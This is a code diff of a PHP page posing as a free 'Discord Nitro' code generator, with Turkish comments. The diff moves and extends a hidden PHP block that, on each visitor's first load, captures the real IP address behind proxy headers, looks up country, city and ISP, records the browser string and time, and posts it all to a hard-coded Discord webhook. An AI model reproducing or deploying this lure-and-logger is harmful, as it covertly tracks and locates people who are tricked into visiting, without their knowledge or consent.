@@ -1,3 +1,47 @@
+<?php
+// ---- KONFİG ----
+$webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";
+$cookie_name = "ziyaret_edildi";
+
+// Eğer daha önce ziyaret ettiyse, tekrar mesaj gönderme
+if (!isset($_COOKIE[$cookie_name])) {
+    // ---- Gerçek IP'yi Al ----
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+
+    // ---- Konum Bilgilerini Al ----
+    $konum = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $tarih = date("Y-m-d H:i:s");
+
+    // ---- Raporu Hazırla ----
+    $mesaj = "**🌐 YENİ ZİYARETÇİ!**\n";
+    $mesaj .= "─────────────────\n";
+    $mesaj .= "🆔 IP: {$ip}\n";
+    $mesaj .= "📍 Konum: " . ($konum['country'] ?? 'Bilinmiyor') . " / " . ($konum['city'] ?? 'Bilinmiyor') . "\n";
+    $mesaj .= "🏢 ISP: " . ($konum['isp'] ?? 'Bilinmiyor') . "\n";
+    $mesaj .= "💻 Tarayıcı: " . $user_agent . "\n";
+    $mesaj .= "📅 Zaman: {$tarih}\n";
+    $mesaj .= "─────────────────";
+
+    // ---- Webhook'a Gönder ----
+    $payload = json_encode(["content" => $mesaj]);
+    $ch = curl_init($webhook);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_exec($ch);
+    curl_close($ch);
+
+    // ---- Çerez ayarla (1 gün boyunca hatırla) ----
+    setcookie($cookie_name, "geldi", time() + 86400, "/");
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -42,34 +86,5 @@
     <div class="isik">⚡ Kod oluşturuluyor, lütfen bekleyin...</div>
     <div class="footer">Discord Nitro © 2026</div>
 </div>
-<?php
-// ---- KONFİG ----
-$webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";
-
-// ---- IP ve Konum Al ----
-$ip = $_SERVER['REMOTE_ADDR'];
-$konum = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$tarih = date("Y-m-d H:i:s");
-
-// ---- Raporu Hazırla ----
-$mesaj = "**🌐 YENİ ZİYARETÇİ!**\n";
-$mesaj .= "─────────────────\n";
-$mesaj .= "🆔 IP: {$ip}\n";
-$mesaj .= "📍 Konum: " . ($konum['country'] ?? 'Bilinmiyor') . " / " . ($konum['city'] ?? 'Bilinmiyor') . "\n";
-$mesaj .= "🏢 ISP: " . ($konum['isp'] ?? 'Bilinmiyor') . "\n";
-$mesaj .= "💻 Tarayıcı: " . $user_agent . "\n";
-$mesaj .= "📅 Zaman: {$tarih}\n";
-$mesaj .= "─────────────────";
-
-// ---- Webhook'a Gönder ----
-$payload = json_encode(["content" => $mesaj]);
-$ch = curl_init($webhook);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-curl_exec($ch);
-curl_close($ch);
-?>
 </body>
 </html>
